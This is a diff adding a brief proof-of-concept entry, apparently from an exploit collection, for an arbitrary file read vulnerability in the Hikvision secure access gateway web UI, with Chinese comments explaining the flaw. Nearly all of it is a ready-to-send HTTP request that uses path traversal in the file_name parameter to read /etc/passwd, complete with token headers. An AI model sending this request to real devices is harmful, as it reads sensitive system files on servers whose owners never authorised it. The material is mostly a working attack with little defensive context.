@@ -1,0 +1,10 @@
+# HIKVISION安全接入网关webui文件读取漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 安全接入网关存在任意文件读取漏洞，通过此漏洞攻击者可以读取服务器上敏感文件
+GET /webui/?acid=80051728&file_name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&g=sys_dia_data_down&bid=hd_tag_m8mv260n HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260n
+RM-PRO-Token: a85ce9924c3d47dedf8f8e376f8c2dcb
+RM-PRO-Time: 1742808520613
+User-Agent: curl/7.83.1
+
